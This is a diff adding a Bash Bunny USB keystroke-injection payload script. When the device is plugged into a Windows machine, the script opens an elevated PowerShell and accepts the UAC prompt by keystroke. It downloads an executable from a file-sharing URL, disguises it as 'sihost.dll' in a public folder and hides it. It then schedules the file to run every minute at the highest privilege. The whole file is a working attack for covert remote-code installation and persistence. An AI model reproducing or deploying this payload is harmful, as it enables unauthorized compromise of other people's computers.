@@ -1,0 +1,47 @@
+#!/bin/bash
+
+# DELAY IN MS
+# SFD = Super Fast Delay (waiting for CTRL V for example)
+SFD=100
+# FD = Fast Delay (waiting for WIN R for example)
+FD=500
+# ND = Normal Delay (waiting for programs to shut off)
+ND=1000
+# LD = Long Delay (waiting for programs to start or bash scripts to execute)
+LD=1500
+
+# SETUP
+LED M
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+DRIVER_LABEL='USB'
+
+# ATTACK
+LED ATTACK
+QUACK DELAY $FD
+QUACK GUI r
+QUACK DELAY $FD
+QUACK STRING 'C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe' Start-Process -FilePath 'C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe' -Verb runAs
+QUACK ENTER
+QUACK DELAY $LD
+QUACK ALT y
+QUACK DELAY $LD
+QUACK STRING Invoke-WebRequest -Uri https://filebin.net/ulypgxtl8ytmsr9o/putty.exe -OutFile 'C:/Users/Public/Libraries/sihost.dll'
+QUACK ENTER
+QUACK DELAY $FD
+QUACK STRING attrib +s +h 'C:/Users/Public/Libraries/sihost.dll'
+QUACK ENTER
+QUACK DELAY $FD
+QUACK STRING cmd.exe /c 'schtasks /create /sc minute /mo 1 /tn Sihost /tr C:/Users/Public/Libraries/sihost.dll /rl HIGHEST /f'
+QUACK ENTER
+QUACK DELAY $FD
+QUACK STRING exit
+QUACK ENTER
+QUACK DELAY $FD
+
+# CLEANUP
+LED Y
+
+# FINISH
+LED FINISH
+ATTACKMODE OFF
